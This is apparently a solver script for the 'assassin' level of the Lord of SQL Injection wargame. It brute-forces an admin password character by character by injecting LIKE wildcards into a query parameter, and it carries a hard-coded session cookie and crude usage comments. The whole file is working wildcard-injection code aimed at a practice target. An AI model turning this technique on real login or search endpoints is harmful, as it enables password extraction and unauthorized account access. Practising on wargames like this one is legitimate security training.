import requests
headers= {'Cookie':'PHPSESSID=qet57jlmrh1sabcamosgidu7v9'}
wordlist = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
for thing in wordlist:
    r = requests.get(f"https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=902efd1{thing}%",headers=headers).text
    if "<h2>Hello guest</h2>" in r:
        print(f"Guest pw starts with: {thing}")
    elif "<h2>Hello admin</h2>" in r:
        print(f"Admin pw starts with: {thing}")
    print(thing)

### SOLVED ###
# just run this shit starting with nothing at first, then prepend your known chars with the percentage wildcard
# turns out the guest and admin pw has the same first 2 chars lmao